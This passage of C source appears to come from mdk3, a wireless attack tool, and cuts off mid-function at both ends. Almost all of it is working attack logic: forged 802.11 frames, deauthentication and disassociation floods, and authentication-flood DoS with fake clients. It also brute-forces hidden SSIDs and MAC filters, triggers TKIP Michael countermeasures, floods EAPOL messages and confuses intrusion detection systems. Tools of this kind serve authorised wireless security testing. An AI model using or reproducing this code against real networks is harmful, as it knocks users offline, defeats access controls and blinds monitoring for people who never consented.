    }
    else {
        if(wep) pkt[34]='\x11';
        else pkt[34]='\x01';
    }
    // Set random mac
    if (advanced) {
	mac.data = (uchar *) fakeap.mac;
    } else {
	if (random_mac) mac = generate_mac(0);
	    else mac = generate_mac(2);
    }
    memcpy(pkt+10, mac.data, ETH_MAC_LEN);
    memcpy(pkt+16, mac.data, ETH_MAC_LEN);
    // Set SSID
    pkt[37] = (uchar) slen;
    memcpy(pkt+38, ssid, slen);
    // Set Parameters 1
    memcpy(pkt+38+slen, param1, modelen);
    // Set Channel
    pkt[38+slen+modelen] = chan;
    // Set Parameters 2
    memcpy(pkt+39+slen+modelen, param2, 14);
    //Set WPA tag
    if(wep == 2) {	//If TKIP
        memcpy(pkt+53+slen+modelen, wpatkip, 26);
        modelen += 26;	//Let's just reuse the variable from 'gmode'.
    }
    else if(wep == 3) {	//If AES
        memcpy(pkt+53+slen+modelen, wpaaes, 26);
        modelen += 26;
   }

    retn.data = pkt;
    retn.len = slen+53+modelen;

    return retn;
}

struct pckt create_auth_frame(uchar *ap, int random_mac, uchar *client_mac)
{
// Generating an authentication frame

    struct pckt retn;
    char *hdr = "\xb0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00";
    struct pckt mac;

    memcpy(pkt, hdr, 31);
    // Set target AP
    memcpy(pkt+4, ap, ETH_MAC_LEN);
    memcpy(pkt+16,ap, ETH_MAC_LEN);
    // Set client MAC
    if (client_mac == NULL) {
	if (random_mac) mac = generate_mac(0);
	    else mac = generate_mac(1);
	memcpy(pkt+10,mac.data,ETH_MAC_LEN);
    } else {
	memcpy(pkt+10,client_mac,ETH_MAC_LEN);
    }
    retn.len = 30;
    retn.data = pkt;

    return retn;
}

struct pckt create_probe_frame(char *ssid, struct pckt mac)
{
// Generating Probe Frame

    struct pckt retn;
    char *hdr = "\x40\x00\x00\x00\xff\xff\xff\xff\xff\xff";
    char *bcast = "\xff\xff\xff\xff\xff\xff";
    char *seq = "\x00\x00\x00";
    char *rates = "\x01\x04\x82\x84\x8b\x96";
    int slen;

    slen = strlen(ssid);

    memcpy(pkt, hdr, 10);
    // MAC which is probing
    memcpy(pkt+10, mac.data, ETH_MAC_LEN);
    // Destination: Broadcast
    memcpy(pkt+16, bcast, ETH_MAC_LEN);
    // Sequence
    memcpy(pkt+22, seq, 3);
    // SSID
    pkt[25] = slen;
    memcpy(pkt+26, ssid, slen);
    // Supported Bitrates (1, 2, 5.5, 11 MBit)
    memcpy(pkt+26+slen, rates, ETH_MAC_LEN);

    retn.data = pkt;
    retn.len = 26 + slen + ETH_MAC_LEN;

    return retn;
}

struct pckt create_deauth_frame(uchar *mac_sa, uchar *mac_da, uchar *mac_bssid, int disassoc)
{
// Generating deauthentication or disassociation frame

    struct pckt retn;           //DEST              //SRC
    char *hdr = "\xc0\x00\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		 //BSSID             //SEQ  //Reason:unspec
		"\x00\x00\x00\x00\x00\x00\x70\x6a\x01\x00";

    memcpy(pkt, hdr, 25);
    if (disassoc) pkt[0] = '\xa0';
    // Set target Dest, Src, BSSID
    memcpy(pkt+4, mac_da, ETH_MAC_LEN);
    memcpy(pkt+10,mac_sa, ETH_MAC_LEN);
    memcpy(pkt+16,mac_bssid, ETH_MAC_LEN);

    retn.len = 26;
    retn.data = pkt;

    return retn;
}

struct pckt create_assoc_frame_simple(uchar *ap, uchar *mac, uchar *capability, uchar *ssid, int ssid_len)
{

  struct pckt retn;
  retn.data = pkt;
  retn.len = 0;

  //Association Request Header
  memset(retn.data, '\x00', 4);

  //Destination = AP
  memcpy(retn.data+4, ap, ETH_MAC_LEN);

  //Source
  memcpy(retn.data+10, mac, ETH_MAC_LEN);

  //BSSID
  memcpy(retn.data+16, ap, ETH_MAC_LEN);

  //Sequence + Fragments
  memset(retn.data+22, '\x00', 2);

  //Capabilities (should be copied from beacon frame to be compatible to the AP)
  memcpy(retn.data+24, capability, 2);

  //Listen Interval (Hardcoded 0a 00) + SSID Tag (00)
  memcpy(retn.data+26, "\x0a\x00\x00", 3);

  //SSID
  retn.data[29] = (uchar) ssid_len;
  memcpy(retn.data+30, ssid, ssid_len);
  retn.len = 30 + ssid_len;

  //Supported Rates / Extended Rates
  memcpy(retn.data + retn.len, SUPP_RATES, 10);
  retn.len += 10;
  memcpy(retn.data + retn.len, EXT_RATES, 6);
  retn.len += 6;

  return retn;
}

struct pckt amok_machine(char *filename)
{
    // FSM for multi-way deauthing
    static time_t t_prev = 0;

    switch (state) {
	case 0:
	    newone:

	    if (wblist) {			//Periodically re-read list every LIST_REREAD_PERIOD sec.
		if (t_prev == 0) {
		    printf("Periodically re-reading blacklist/whitelist every %d seconds\n\n", LIST_REREAD_PERIOD);
		}
		if (time(NULL) - t_prev >= LIST_REREAD_PERIOD) {
		    t_prev = time( NULL );
		    load_whitelist(filename);
		}
	    }

	    pkt_amok = get_target_deauth();
	    if ((pkt_amok[1] & '\x01') && (pkt_amok[1] & '\x02')) {	// WDS packet
		mac_sa = pkt_amok + 4;
		mac_ta = pkt_amok + 10;
		wds = 1;
	    }
	    else if (pkt_amok[1] & '\x01') {		// ToDS packet
		mac_ta = pkt_amok + 4;
		mac_sa = pkt_amok + 10;
		wds = 0;
	    }
	    else if (pkt_amok[1] & '\x02') {		// FromDS packet
		mac_sa = pkt_amok + 4;
		mac_ta = pkt_amok + 10;
		wds = 0;
	    }
	    else if ((!(pkt_amok[1] & '\x01')) && (!(pkt_amok[1] & '\x02'))) {	//AdHoc packet
		mac_sa = pkt_amok + 10;
		mac_ta = pkt_amok + 16;
		wds = 0;
	    }
	    else {
		goto newone;
	    }

	    if (wblist == 2) {			//Using Blacklist mode - Skip if neither Client nor AP is in list
		if (!(is_whitelisted(mac_ta)) && !((is_whitelisted(mac_sa))))
		    goto newone;
	    }
            if (wblist == 1) {			//Using Whitelist mode - Skip if Client or AP is in list
		if (is_whitelisted(mac_ta)) goto newone;
		if (is_whitelisted(mac_sa)) goto newone;
	    }

	    state = 1;
	    return create_deauth_frame(mac_ta, mac_sa, mac_ta, 1);
	case 1:
	    state = 2;
	    if (wds) state = 4;
	    return create_deauth_frame(mac_ta, mac_sa, mac_ta, 0);
	case 2:
	    state = 3;
	    return create_deauth_frame(mac_sa, mac_ta, mac_ta, 1);
	case 3:
	    state = 0;
	    return create_deauth_frame(mac_sa, mac_ta, mac_ta, 0);
	case 4:
	    state = 5;
	    return create_deauth_frame(mac_sa, mac_ta, mac_sa, 1);
	case 5:
	    state = 0;
	    return create_deauth_frame(mac_sa, mac_ta, mac_sa, 0);
	}

    // We can never reach this part of code unless somebody messes around with memory
    // But just to make gcc NOT complain...
    return create_deauth_frame(mac_sa, mac_ta, mac_sa, 0);
}

struct pckt ssid_brute()
{
    struct pckt pkt;
    pthread_t sniffer;
    char *ssid;

    // GCC Warning avoidance
    pkt.data = NULL;
    pkt.len = 0;

    if (state == 0) {
//state0
//- SPAWN Sniffer thread
	pthread_create( &sniffer, NULL, (void *) ssid_brute_sniffer, (void *) 1);
//- sniff beacon frame from target / do nothin if target==NULL
	if (target != NULL) {
	    pkt = get_target_ssid();
//- set lenght variable
	    ssid_len = pkt.len;
	    if (ssid_len == 1)
		ssid_len = 0;	//Compensate for 1-byte placeholder SSIDs
//- set state1
	    state = 1;
//-> return probe packet using the SSID supplied by beacon frame
	    return create_probe_frame((char *)pkt.data, generate_mac(1));
	}
//- In untargetted mode, continue
	state = 1;
    }

    if (state == 1) {
//state1
	newssid:
//- read SSID from file
	ssid = read_line_from_file();
//- if lenght!=0, continue to next one if length does not match
	if (ssid_len != 0) if ((unsigned int) ssid_len != strlen(ssid)) goto newssid;
//- Stop work if EOF is reached
	if (ssid_eof) {
	    printf("\nEnd of SSID list reached.\n");
	    exit_now = 1;
	}
//-> return packet containing SSID
	return create_probe_frame(ssid, generate_mac(1));
    }

    return pkt;
}

struct pckt ssid_brute_real()
{
    struct pckt pkt;
    pthread_t sniffer;
    char *ssid;
    static int unknown_len = 0;

    // GCC Warning avoidance
    pkt.data = NULL;
    pkt.len = 0;

    if (state == 0) {
//state0
//- SPAWN Sniffer thread
	pthread_create( &sniffer, NULL, (void *) ssid_brute_sniffer, (void *) 1);
//- sniff beacon frame from target / do nothin if target==NULL
	if (target != NULL) {
	    pkt = get_target_ssid();
//- set lenght variable
	    ssid_len = pkt.len;

	    if ((ssid_len == 1) || (ssid_len == 0)) {
		ssid_len = 1;    //Compensate 0 and 1-byte placeholder SSIDs as maximum len
		unknown_len = 1;
	    }
//- set state1
	    state = 1;
//-> return probe packet using the SSID supplied by beacon frame
	    return create_probe_frame((char *)pkt.data, generate_mac(1));
	}
//- In untargetted mode, continue
	state = 1;
    }

    if (state == 1) {
//state1
//- get SSID to probe for
	bruteforce_ssid();
	ssid = brute_ssid;
//- Stop work if last SSID is generated and sent
	if (end) {
	    if (unknown_len) {
		printf("\nAll %d possible SSIDs with length %d sent, trying length %d.\n", turns-1, ssid_len, ssid_len+1);
		end = 0; turns = 0; //Resetting bruteforce counters, trying one byte more
		memset(brute_ssid, 0, (256 * sizeof(char)));
		ssid_len++;
            } else {
		if (max_permutations) printf("\nall %d possible SSIDs sent.\n", turns-1);
		else printf("\nall %d possible SSIDs sent.\n", max_permutations);
		exit_now = 1;
	    }
	}
//-> return packet containing SSID
	return create_probe_frame(ssid, generate_mac(1));
    }

    return pkt;

}

struct pckt false_tkip(uchar *target)
{
    struct pckt michael, src;
    int length, i, prio;

    if (useqosexploit) {
	printf("Waiting for one QoS Data Packet...\n");

	while(1) {
	    length = read_packet(pkt_sniff, MAX_PACKET_LENGTH);
	    //QoS?
	    if (pkt_sniff[0] != 0x88) continue;
	    //ToDS?
	    if (! (pkt_sniff[1] & 0x01)) continue;
	    //And not WDS?
	    if (pkt_sniff[1] & 0x02) continue;
	    //From our target?
	    if (target == NULL) break;
	    if (memcmp(pkt_sniff+4, target, ETH_MAC_LEN)) continue;
	    break;
	}

	uchar *mac = pkt_sniff + 4;

	printf("QoS PACKET to %02X:%02X:%02X:%02X:%02X:%02X with Priority %d! Reinjecting...\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], pkt_sniff[24]);
//	print_packet(pkt_sniff, length);

	prio = pkt_sniff[24];

	for (i=0; i < 3 ; i++) {
	    if (prio == i) continue;
	    pkt_sniff[24] = i;
	    send_packet(pkt_sniff, length);
	}

	i++;
	michael.data = pkt_sniff;
	michael.len = length;

	return michael;

    } else {
	// length = (rand() % 246) + 20;
	length = 32;
	src = generate_mac(0);
    
	src.data[0] = 0x00;
    
	michael.len = length + 32;
	michael.data = (uchar*) malloc(michael.len);
	memcpy(michael.data, MICHAEL, 32);
	memcpy(michael.data+4, target, ETH_MAC_LEN);
	memcpy(michael.data+10, src.data, ETH_MAC_LEN);
	memcpy(michael.data+16, target, ETH_MAC_LEN);
    
	//random extended IV
	michael.data[24] = rand() & 0xFF;
	michael.data[25] = rand() & 0xFF;
	michael.data[26] = rand() & 0xFF;
    
	//random data
	for(i=0; i<length; i++) {
	    michael.data[i+32] = rand() & 0xFF;
	}
    }

    return michael;
}

struct pckt create_assoc_frame(uchar *ssid, int ssid_len, uchar *ap, uchar *sta, int auth_flag, int ucast_flag, int mcast_flag)
{
  struct pckt retn;
  int ofs = 0;
  char *hdr = "\x00\x00\x3a\x01"     // type, fc, duration
	"\x00\x00\x00\x00\x00\x00"   // da
	"\x00\x00\x00\x00\x00\x00"   // sa
	"\x00\x00\x00\x00\x00\x00"   // bssid
	"\x00\xa6"                   // frag, seq
	"\x31\x05\x0a\x00"           // caps
	"\x00";                      // ssid tag

  memcpy(pkt, hdr, 29);
  memcpy(pkt + 4, ap, ETH_MAC_LEN);            // set AP
  memcpy(pkt + 10, sta, ETH_MAC_LEN);          // set STA
  memcpy(pkt + 16, ap, ETH_MAC_LEN);           // set BSSID
  pkt[29] = ssid_len;                // set SSID len
  memcpy(pkt + 30, ssid, ssid_len);  // set SSID
  ofs = 30 + ssid_len;
  memcpy(pkt + ofs, SUPP_RATES, 10); // set supported rates
  ofs += 10;
  memcpy(pkt + ofs, EXT_RATES, 6);   // set extended rates
  ofs += 6;

  if (auth_flag == FLAG_AUTH_WPA) {
    pkt[ofs] = 0xdd;                 // set VSA id
    pkt[ofs + 1] = 22;               // set len
    ofs += 2;
    memcpy(pkt + ofs, IE_WPA, 6);    // set WPA IE
    ofs += 6;

    // set multicast cipher stuff
    switch (mcast_flag) {
      case FLAG_TKIP:
        memcpy(pkt + ofs, IE_WPA_TKIP, 4);
        break;
      case FLAG_CCMP:
        memcpy(pkt + ofs, IE_WPA_CCMP, 4);
        break;
    }

    // set number of unicast ciphers (1)
    pkt[ofs + 4] = 0x01;
    pkt[ofs + 5] = 0x00;
    ofs += 6;

    // set unicast cipher stuff
    switch (ucast_flag) {
      case FLAG_TKIP:
        memcpy(pkt + ofs, IE_WPA_TKIP, 4);
        break;
      case FLAG_CCMP:
        memcpy(pkt + ofs, IE_WPA_CCMP, 4);
        break;
    }

    // set number of auth key management suites (1)
    pkt[ofs + 4] = 0x01;
    pkt[ofs + 5] = 0x00;
    ofs += 6;
    memcpy(pkt + ofs, IE_WPA_KEY_MGMT, 4);
    ofs += 4;

  } // FLAG_AUTH_WPA


  if (auth_flag == FLAG_AUTH_RSN) {
    memcpy(pkt + ofs, IE_RSN, 4);    // set RSN IE
    ofs += 4;

    // set multicast cipher stuff
    switch (mcast_flag) {
      case FLAG_TKIP:
        memcpy(pkt + ofs, IE_RSN_TKIP, 4);
        break;
      case FLAG_CCMP:
        memcpy(pkt + ofs, IE_RSN_CCMP, 4);
        break;
    }

    // set number of unicast ciphers (1)
    pkt[ofs + 4] = 0x01;
    pkt[ofs + 5] = 0x00;
    ofs += 6;

    // set unicast cipher stuff
    switch (ucast_flag) {
      case FLAG_TKIP:
        memcpy(pkt + ofs, IE_RSN_TKIP, 4);
        break;
      case FLAG_CCMP:
        memcpy(pkt + ofs, IE_RSN_CCMP, 4);
        break;
    }

    // set number of auth key management suites (1)
    pkt[ofs + 4] = 0x01;
    pkt[ofs + 5] = 0x00;
    ofs += 6;
    memcpy(pkt + ofs, IE_RSN_KEY_MGMT, 4);
    ofs += 4;

  } // FLAG_AUTH_RSN

  retn.len = ofs;
  retn.data = pkt;

  return retn;
}

struct pckt eapol_machine(char *ssid, int ssid_len, uchar *target, int flag_wtype, int flag_ucast, int flag_mcast)
{
  struct pckt retn;
  int co, flag, len;
  int wait_max_frames = 50;

  // GCC Warning avoidance
  retn.data = NULL;
  retn.len = 0;

retry:

  // FSM: auth => assoc => eapol start flood

  switch (eapol_state) {

    // assoc
    case 0:
      // create a random auth frame
      retn = create_auth_frame(target, 0, NULL);
      // save STA MAC for later purposes
      memcpy(eapol_src, retn.data + 10, 6);
      eapol_state = 1;
      return retn;

    // auth
    case 1:
      // wait for answer from AP (authentication frame)
      co = 0;
      flag = 0;
      while (1) {
        co++;
        if (co > wait_max_frames) break;
        len = read_packet(pkt_sniff, MAX_PACKET_LENGTH);
        if (pkt_sniff[0] == 0xb0) {
          printf("\ngot authentication frame: ");
          if (! memcmp(target, pkt_sniff + 10, ETH_MAC_LEN) && (pkt_sniff[28] == 0x00)) {
            printf("authentication was successful\n");
            flag = 1;
            break;
          } else printf("from wrong AP or failed authentication!\n");
	}
      }  // while

      if (flag) {
        eapol_state = 2;
        return create_assoc_frame((uchar *) ssid, ssid_len, target, eapol_src, flag_wtype, flag_ucast, flag_mcast);
      } else {
        eapol_state = 0;
        goto retry;
      }
      break;

    // EAPOL Start
    case 2:
      co = 0;
      flag = 0;
      // wait for association response frame
      while (1) {
        co++;
        if (co > wait_max_frames) break;
        len = read_packet(pkt_sniff, MAX_PACKET_LENGTH);
        if (pkt_sniff[0] == 0x10) {
          printf("got association response frame: ");
          if (! memcmp(target, pkt_sniff + 10, ETH_MAC_LEN) && (pkt_sniff[26] == 0x00) ) {
            printf("association was successful\n");
            flag = 1;
            break;
          } else printf("from wrong AP or failed association!\n");
	}
      }  // while

      if (flag) {
        eapol_state = 3;
        goto retry;
      } else {
        // retry auth and assoc
        eapol_state = 0;
        goto retry;
      }
      break;

    case 3:
      memcpy(pkt, PKT_EAPOL_START, 36);
      memcpy(pkt + 4, target, ETH_MAC_LEN);
      memcpy(pkt + 10, eapol_src, ETH_MAC_LEN);
      memcpy(pkt + 16, target, ETH_MAC_LEN);
      retn.len = 36;
      retn.data = pkt;
      return retn;
    }

    // We can never reach this part of code unless somebody messes around with memory
    // But just to make gcc NOT complain...
    return retn;
}

struct pckt eapol_logoff(uchar *ap, uchar *sta)
{
  struct pckt retn;

  memcpy(pkt, PKT_EAPOL_LOGOFF, 36);
  memcpy(pkt + 4, ap, ETH_MAC_LEN);
  memcpy(pkt + 10, sta, ETH_MAC_LEN);
  memcpy(pkt + 16, ap, ETH_MAC_LEN);
  retn.len = 36;
  retn.data = pkt;
  return retn;
}

struct pckt intelligent_auth_dos(int random_mac)
{

    struct clist *search;
    static int oldclient_count = 0;
    static uchar capabilities[2];
    static uchar *ssid;
    static int ssid_len;
    int len = 0;
    struct pckt fmac;

    // Client status descriptions:
    // 0 : not authed, not associated (kicked / new)
    // 1 : authed but not yet associated
    // 2 : connected (can inject data now)

    if (! init_intelligent) {
	// Building first fake client to initialize list
	if (random_mac) fmac = generate_mac(0);
	    else fmac = generate_mac(1);
	init_clist(&cl, fmac.data, 0, ETH_MAC_LEN);
	current = &cl;

	// Setting up statistics counters
	ia_stats.c_authed = 0;
	ia_stats.c_assoced = 0;
	ia_stats.c_kicked = 0;
	ia_stats.c_created = 1;	//Has been created while initialization
	ia_stats.d_captured = 0;
	ia_stats.d_sent = 0;
	ia_stats.d_responses = 0;
	ia_stats.d_relays = 0;

	// Starting the response sniffer
	pthread_t sniffer;
	pthread_create( &sniffer, NULL, (void *) intelligent_auth_sniffer, (void *) 1);

	// Sniff one beacon frame to read the capabilities of the AP
	printf("Sniffing one beacon frame to read capabilities and SSID...\n");
	while (1) {
	    len = read_packet(pkt_sniff, MAX_PACKET_LENGTH);
	    if (len < 36) continue;
	    if (! memcmp(pkt_sniff, "\x80", 1)) {
	        if (! memcmp(target, pkt_sniff+16, ETH_MAC_LEN)) {
		    //Gotcha!
		    ssid = (uchar *) malloc(257);
		    memcpy(capabilities, pkt_sniff+34, 2);
		    ssid_len = (int) pkt_sniff[37];
		    memcpy(ssid, pkt_sniff+38, ssid_len);
		    ssid[ssid_len] = '\x00';
		    printf("Capabilities are: %02X:%02X\n", capabilities[0], capabilities[1]);
		    printf("SSID is: %s\n", ssid);
		    break;
		}
	    }
        }

	// We are now set up
	init_intelligent = 1;
    }

    // Skip some clients for more variety
    current = current->next;
    current = current->next;

    if (oldclient_count < 30) {
	// Make sure that mdk3 doesn't waste time reauthing kicked clients or keeping things alive
	// Every 30 injected packets, it should fake another client
	oldclient_count++;

	search = search_status(current->next, 1);
	if (search != NULL) {
	    //there is an authed client that needs to be associated
	    return create_assoc_frame_simple(target, search->data, capabilities, ssid, ssid_len);
	}

	search = search_status(current->next, 2);
	if (search != NULL) {
	    //there is a fully authed client that should send some data to keep it alive
	    if (we_got_data) {
		ia_stats.d_sent++;
		return get_data_for_intelligent_auth_dos(search->data);
	    }
	}
    }

    // We reach here if there either were too many or no old clients
    search = NULL;

    // Search for a kicked client if we didn't reach our limit yet
    if (oldclient_count < 30) {
	oldclient_count++;
	search = search_status(current, 0);
    }
    // And make a new one if none is found
    if (search == NULL) {
	if (random_mac) fmac = generate_mac(0);
	    else fmac = generate_mac(1);
	search = add_to_clist(current, fmac.data, 0, ETH_MAC_LEN);
	ia_stats.c_created++;
	oldclient_count = 0;
    }

    // Authenticate the new/kicked clients
    return create_auth_frame(target, 0, search->data);
}

struct pckt wids_machine()
{
    int t;
    struct clistwidsclient *search;

    if (! init_wids) {
	// WIDS confusion initialisation

	wids_stats.aps = 0;
	wids_stats.clients = 0;
	wids_stats.cycles = 0;
	wids_stats.deauths = 0;

	printf("\nWaiting 10 seconds for initialization...\n");

	pthread_t sniffer;
	pthread_create( &sniffer, NULL, (void *) wids_sniffer, (void *) 1);

	for (t=0; t<10; t++) {
	    sleep(1);
	    printf("\rAPs found: %d   Clients found: %d", wids_stats.aps, wids_stats.clients);
	}

	while (!init_aplist) {
	    printf("\rNo APs have been found yet, waiting...\n");
	    sleep(5);
	}
	while (!init_clientlist) {
	    printf("\rNo clients found yet. If it doesn't start, maybe you need to fake additional clients with -c\n");
	    sleep(5);
	}
	init_wids = 1;
    }

    // Move forward some steps
    char rnd = random() % 13;
    for (t=0; t<rnd; t++) {
	clwc_cur = clwc_cur->next;
	clwa_cur = clwa_cur->next;
    }

    //Checking for any half open connection
    search = search_status_widsclient(clwc_cur, 1, get_channel());
    if (search != NULL) {  //Found client authed but not assoced
	if (search->retry > 10) {
	    search->status = 0;
	    search->retry = 0;
	}
	search->retry++;
//printf("\rAssociating Client: %02X:%02X:%02X:%02X:%02X:%02X on AP %02X:%02X:%02X:%02X:%02X:%02X           \n", search->mac[0], search->mac[1], search->mac[2], search->mac[3], search->mac[4], search->mac[5], search->bssid->bssid[0], search->bssid->bssid[1], search->bssid->bssid[2], search->bssid->bssid[3], search->bssid->bssid[4], search->bssid->bssid[5]);
	return create_assoc_frame_simple(search->bssid->bssid, search->mac, search->bssid->capa, essid, essid_len);
    }
    search = search_status_widsclient(clwc_cur, 2, get_channel());
    if (search != NULL) {  //Found client assoced but sent no data yet
	search->status = 0;
	wids_stats.cycles++;
	return get_data_for_wids(search);
    }

    //Chosing current client and connect him to the next AP in the list
    do {
	if (zc_exploit) { // Zero: Connecting to foreign AP
	    clwc_cur->bssid = clwa_cur->next;
	    clwa_cur = clwa_cur->next;
	} else { // ASPj: Connecting to WDS AP
	    clwc_cur->bssid = clwc_cur->bssid->next;
	}
    } while (clwc_cur->bssid->channel != get_channel());

//printf("\rConnecting Client: %02X:%02X:%02X:%02X:%02X:%02X on AP %02X:%02X:%02X:%02X:%02X:%02X           \n", clwc_cur->mac[0], clwc_cur->mac[1], clwc_cur->mac[2], clwc_cur->mac[3], clwc_cur->mac[4], clwc_cur->mac[5], clwc_cur->bssid->bssid[0], clwc_cur->bssid->bssid[1], clwc_cur->bssid->bssid[2], clwc_cur->bssid->bssid[3], clwc_cur->bssid->bssid[4], clwc_cur->bssid->bssid[5]);

    return create_auth_frame(clwc_cur->bssid->bssid, 0, clwc_cur->mac);
}

struct pckt mac_bruteforcer()
{
    struct pckt rtnpkt;
    static uchar *current_mac;
    int get_new_mac = 1;
    static struct timeval tv_start, tv_end, tv_diff, tv_temp, tv_temp2;
    struct timespec wait;

    if (! mac_b_init) {
	pthread_cond_init (&has_packet, NULL);
	pthread_mutex_init (&has_packet_mutex, NULL);
	pthread_mutex_unlock (&has_packet_mutex);
	pthread_cond_init (&clear_packet, NULL);
	pthread_mutex_init (&clear_packet_mutex, NULL);
	pthread_mutex_unlock (&clear_packet_mutex);

	tv_dyntimeout.tv_sec = 0;
	tv_dyntimeout.tv_usec = 100000;	//Dynamic timeout initialized with 100 ms

	pthread_t sniffer;
	pthread_create( &sniffer, NULL, (void *) mac_bruteforce_sniffer, (void *) 1);
    }

    if (mac_b_init) {
	//Wait for an answer to the last packet
	gettimeofday(&tv_temp, NULL);
	timeradd(&tv_temp, &tv_dyntimeout, &tv_temp2);
	TIMEVAL_TO_TIMESPEC(&tv_temp2, &wait);
	pthread_cond_timedwait(&has_packet, &has_packet_mutex, &wait);

	//has packet after timeout?
	if (has_packet_really) {
	    //  if yes: if this answer is positive, copy the MAC, print it and exit!
	    if (memcmp(target, pkt_sniff+4, 6)) // Filter out own packets & APs responding strangely (authing themselves)
	    if ((pkt_sniff[28] == 0x00) && (pkt_sniff[29] == 0x00)) {
		uchar *p = pkt_sniff;
		printf("\n\nFound a valid MAC adress: %02X:%02X:%02X:%02X:%02X:%02X\nHave a nice day! :)\n",
		       p[4], p[5], p[6], p[7], p[8], p[9]);
		exit(0);
	    }

	    //  if this is an answer to our current mac: get a new mac later
	    if (! memcmp(pkt_sniff+4, current_mac, 6)) {
		get_new_mac = 1;
		mac_brute_speed++;

		//  get this MACs check time, calculate new timeout
		gettimeofday(&tv_end, NULL);
		tvdiff(&tv_end, &tv_start, &tv_diff);

		/* #=- The magic timeout formula -=# */
		//If timeout is more than 500 ms, it sure is due to weak signal, so drop the calculation
		if ((tv_diff.tv_sec == 0) && (tv_diff.tv_usec < 500000)) {

		    //If timeout is lower, go down pretty fast (half the difference)
		    if (tv_diff.tv_usec < tv_dyntimeout.tv_usec) {
			tv_dyntimeout.tv_usec += (((tv_diff.tv_usec * 2) - tv_dyntimeout.tv_usec) / 2);
		    } else {
		    //If timeout is higher, raise only a little
			tv_dyntimeout.tv_usec += (((tv_diff.tv_usec * 4) - tv_dyntimeout.tv_usec) / 4);
		    }
		    //High timeouts due to bad signal? Don't go above 250 milliseconds!
		    //And avoid a broken timeout (less than half an ms, more than 250 ms)
		    if (tv_dyntimeout.tv_usec > 250000) tv_dyntimeout.tv_usec = 250000;
		    if (tv_dyntimeout.tv_usec <    500) tv_dyntimeout.tv_usec =    500;
		}
	    }

	    //reset has_packet, send condition clear_packet (after memcpy!)
	    has_packet_really = 0;
	    pthread_cond_signal(&clear_packet);

	// if not: dont get a new mac later!
	} else {
	    get_new_mac = 0;
	    mac_brute_timeouts++;
	}
    }

    // Get a new MAC????
    if (get_new_mac) {
	current_mac = get_next_mac();
	// Set this MACs first time mark
	gettimeofday(&tv_start, NULL);
    }
    // Create packet and send
    rtnpkt = create_auth_frame(target, 0, current_mac);

    mac_b_init = 1;

    return rtnpkt;
}

struct pckt wpa_downgrade()
{

    struct pckt rtnpkt;
    static int state = 0;
    int plen;

    rtnpkt.len = 0;
    rtnpkt.data = NULL; // A null packet we return when captured packet was useless
			// This ensures that statistics will be printed in low traffic situations

    switch (state) {
	case 0:		// 0: Waiting for a data packet from target

		//Sniff packet
		plen = read_packet(pkt_sniff, MAX_PACKET_LENGTH);
		if (plen < 36) return rtnpkt;
		//Is from target network?
		if (! is_from_target_ap(target, pkt_sniff))
		   return rtnpkt;
		//Is a beacon?
		if (pkt_sniff[0] == 0x80) {
		    wpad_beacons++;
		    return rtnpkt;
		}
		//Is data (or qos data)?
		if ((! (pkt_sniff[0] == 0x08)) && (! (pkt_sniff[0] == 0x88)))
		    return rtnpkt;
		//Is encrypted?
		if (! (pkt_sniff[1] & 0x40)) {
		    if ((pkt_sniff[30] == 0x88) && (pkt_sniff[31] == 0x8e)) { //802.1x Authentication!
			wpad_auth++;
		    } else {
			wpad_wep++;
		    }
		    return rtnpkt;
		}
		//Check WPA Enabled
		if ((pkt_sniff[27] & 0xFC) == 0x00) {
		    wpad_wep++;
		    return rtnpkt;
		}

		state++;

			// 0: Deauth AP -> Station
		return create_deauth_frame(get_macs_from_packet('a', pkt_sniff),
					   get_macs_from_packet('s', pkt_sniff),
					   get_macs_from_packet('b', pkt_sniff), 0);

	break;
	case 1:		// 1: Disassoc AP -> Station

		state++;

		return create_deauth_frame(get_macs_from_packet('a', pkt_sniff),
					   get_macs_from_packet('s', pkt_sniff),
					   get_macs_from_packet('b', pkt_sniff), 1);

	break;
	case 2:		// 2: Deauth Station -> AP

		state++;

		return create_deauth_frame(get_macs_from_packet('s', pkt_sniff),
					   get_macs_from_packet('a', pkt_sniff),
					   get_macs_from_packet('b', pkt_sniff), 0);

	break;
	case 3:		// 3: Disassoc Station -> AP


		//Increase cycle counter
		wpad_cycles++;
		state = 0;

		return create_deauth_frame(get_macs_from_packet('s', pkt_sniff),
					   get_macs_from_packet('a', pkt_sniff),
					   get_macs_from_packet('b', pkt_sniff), 1);

	break;
    }

    printf("BUG: WPA-Downgrade: Control reaches end unexpectedly!\n");
    return rtnpkt;

}

/* Response Checkers */

int get_array_index(int array_len, uchar *ap)
{
// Get index of AP in auth checker array auth[]

    int t;

    for(t=0; t<array_len; t++)
    {
	if (! memcmp(auth[t], ap, ETH_MAC_LEN)) return t;
    }

    return -1;
}

void check_auth(uchar *ap)
{
// Checking if Authentication DoS is successful

    int len = 0;
    int t, pos, resp = 0;

    for (t=0; t<5; t++) 
    {
	len = 0;
	while (len < 22) len = read_packet(pkt_check, MAX_PACKET_LENGTH);
	// Is this frame from the target?
	if (! memcmp(ap, pkt_check+16, ETH_MAC_LEN))
	{
	    // Is this frame an auth response?
	    if (! memcmp(pkt_check, "\xb0", 1))
	    {
		resp = 1;
		goto exiting;  //Hehe, goto forever! ;)
	    }
	}
    }

    exiting:

    pos = get_array_index(auth_count, ap);
    if (pos == -1)  // This ap isn't in our array, so we make a new entry for it
    {
	memcpy (auth[auth_count], ap, ETH_MAC_LEN); //Copy MAC into array
	auths[auth_count][0] = 0;	  //Set Status Flag 0
	auths[auth_count][1] = 0;	  //Init nr of responses
	auths[auth_count][2] = 0;	  //Init nr of missing responses
	pos = auth_count;                 //Set array position
	auth_count++;
	if ((unsigned int) auth_count >=
		sizeof (auths) / sizeof (auths[0]) ) {
		fprintf(stderr, "exceeded max auths[]\n");
		exit (1);
	}
    }

    // So far we have the MAC, know if the AP responded and its position in the array.
    // Checking Status and printf if anything important happened

    int status = auths[pos][0];  // Reading status out of array

    if (status == 0) //Nothing heard from AP so far
    {
	if (resp) //AP responding for the first time
	{
	    auths[pos][0] = 1; //Status 1 = responding
	    auths[pos][1]++;
	    printf("\rAP %02X:%02X:%02X:%02X:%02X:%02X is responding!           \n", ap[0], ap[1], ap[2], ap[3], ap[4], ap[5]);
	}
	return;
    }
    if (status == 1) //Ap is known to respond
    {
